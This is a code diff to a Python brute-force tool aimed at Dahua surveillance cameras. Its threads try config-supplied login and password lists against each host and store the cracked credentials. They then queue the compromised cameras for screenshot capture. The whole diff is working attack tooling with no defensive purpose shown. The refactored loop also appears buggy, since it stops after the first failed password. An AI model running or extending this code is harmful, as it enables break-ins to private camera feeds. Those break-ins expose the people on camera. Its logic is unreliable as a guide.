@@ -1,8 +1,8 @@
-import threading
 import logging
-import config
+import threading
 
-from dahua import DahuaController
+import config
+from dahua import DahuaController, Status
 
 
 class BruteThread(threading.Thread):
@@ -11,6 +11,8 @@ class BruteThread(threading.Thread):
         self.brute_queue = brute_queue
         self.screenshot_queue = screenshot_queue
 
+        self._dahua = DahuaController()
+
     def run(self):
         while True:
             with threading.Lock():
@@ -18,56 +20,34 @@ class BruteThread(threading.Thread):
             self.dahua_auth(host)
             self.brute_queue.task_done()
 
-
-    def dahua_login(self, server_ip, port, login, password):
+    def dahua_login(self, login, password):
         with threading.Lock():
             config.update_status()
-#            logging.info(f'[{config.state}%] Total bruted {len(config.working_hosts)} devices')
-            logging.debug('Login attempt: %s with %s:%s' % (server_ip, login, password))
-        dahua = DahuaController(server_ip, port, login, password)
-        if dahua.status == 0:
-            logging.debug(f'Success login: {server_ip} with {login}:{password}')
-            return dahua
-        elif dahua.status == 2:
-            logging.debug('Blocked camera: %s:%s' % (server_ip, port))
-            return "Blocked"
+            logging.debug(f'Login attempt: {self._dahua.ip} with {login}:{password}')
+        self._dahua.auth(login, password)
+        if self._dahua.status is Status.SUCCESS:
+            logging.debug(f'Success login: {self._dahua.ip} with {login}:{password}')
+            return self._dahua
+        elif self._dahua.status is Status.BLOCKED:
+            logging.debug(f'Blocked camera: {self._dahua.ip}:{self._dahua.port}')
+            return None
         else:
-            logging.debug('Unable to login: %s:%s with %s:%s' % (server_ip, port, login, password))
+            logging.debug(f'Unable to login: {self._dahua.ip}:{self._dahua.port} with {login}:{password}')
             return None
 
-
     def dahua_auth(self, host):
-        server_ip = host[0]
-        port = int(host[1])
-        if config.logopasses:
-#            anti_block = 0
-            for logopass in config.logopasses:
-                password = logopass[1]
-                login = logopass[0]
+        self._dahua.ip = host[0]
+        self._dahua.port = int(host[1])
+        for login in config.logins:
+            for password in config.passwords:
                 try:
-                    res = self.dahua_login(server_ip, port, login, password)
-#                    anti_block += 1
-                    if res == "Blocked": #and anti_block > 4:
+                    res = self.dahua_login(login, password)
+                    if res is None:
                         break
-                    elif res:
-                        config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
-                        config.ch_count += res.channels_count
-                        self.screenshot_queue.put(res)
-                        return
+                    config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
+                    config.ch_count += res.channels_count
+                    self.screenshot_queue.put(res)
+                    return
                 except Exception as e:
-                    logging.debug('Connection error: %s:%s - %s' % (server_ip, port, str(e)))
-        else:
-            for login in config.logins:
-                for password in config.passwords:
-                    try:
-                        res = self.dahua_login(server_ip, port, login, password)
-                        if res == "Blocked":
-                            break
-                        elif res:
-                            config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
-                            config.ch_count += res.channels_count
-                            self.screenshot_queue.put(res)
-                            return
-                    except Exception as e:
-                        logging.debug('Connection error: %s:%s - %s' % (server_ip, port, str(e)))
-        return
+                    logging.debug(f'Connection error: {self._dahua.ip}:{self._dahua.port} - {str(e)}')
+                    return
